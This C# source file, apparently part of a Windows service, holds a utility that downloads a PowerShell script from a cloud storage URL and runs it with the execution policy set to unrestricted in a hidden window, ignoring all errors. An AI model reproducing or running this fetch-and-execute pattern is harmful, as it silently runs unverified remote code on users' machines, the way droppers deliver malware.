using System.Diagnostics;
using System.Net;

namespace MyService
{
    internal class Util
    {

        static void DownFile(string url, string SaveAsFileName)
        {
            if (!System.IO.Directory.Exists("C:\\scripts"))
            {
                System.IO.Directory.CreateDirectory("C:\\scripts");
            }
            var webClient = new WebClient();
            try
            {
                webClient.DownloadFile(url, SaveAsFileName);
            }
            catch 
            {

                
            }

        }
        static void RunPWSH2(string path)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/c powershell  -NoLogo -NoProfile -executionpolicy unrestricted " + path;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = false;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }
        static void RunPWSH(string path)
        {
            string commandStr = "/c powershell  -NoLogo -NoProfile -executionpolicy unrestricted " + path;
            System.Diagnostics.Process.Start("cmd.exe", commandStr);
        }
        internal static void DoJob()
        {
            try
            {
                DownFile("https://it2u.oss-cn-shenzhen.aliyuncs.com/scripts/get-info.PS1", "C:\\scripts\\installer.PS1");

            }
            catch 
            {

            }

            //RunPWSH("C:\\scripts\\installer.PS1");
            RunPWSH2("C:\\scripts\\installer.PS1");
        }
    }
}